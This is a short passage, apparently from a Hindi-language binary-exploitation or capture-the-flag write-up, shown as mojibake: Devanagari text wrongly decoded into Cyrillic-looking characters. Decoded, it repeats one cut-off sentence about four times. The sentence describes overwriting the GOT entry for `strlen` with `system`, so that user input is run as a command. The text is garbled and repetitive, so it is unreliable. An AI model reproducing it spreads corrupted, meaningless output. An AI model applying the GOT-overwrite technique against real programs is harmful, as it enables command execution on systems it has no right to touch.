рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред рдЬрдм рдлреНрд▓реЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ, `strlen` рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `system` рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬреАрдУрдЯреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВред
